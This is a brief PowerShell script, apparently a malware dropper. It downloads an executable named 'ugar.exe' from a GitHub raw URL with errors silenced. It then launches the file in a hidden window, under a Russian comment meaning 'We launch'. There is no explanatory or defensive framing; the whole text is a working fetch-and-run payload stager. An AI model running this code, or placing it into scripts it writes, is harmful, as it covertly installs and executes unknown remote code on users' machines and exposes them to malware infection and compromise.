Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/ugar.exe" -OutFile "ugar.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "ugar.exe" -WindowStyle Hidden

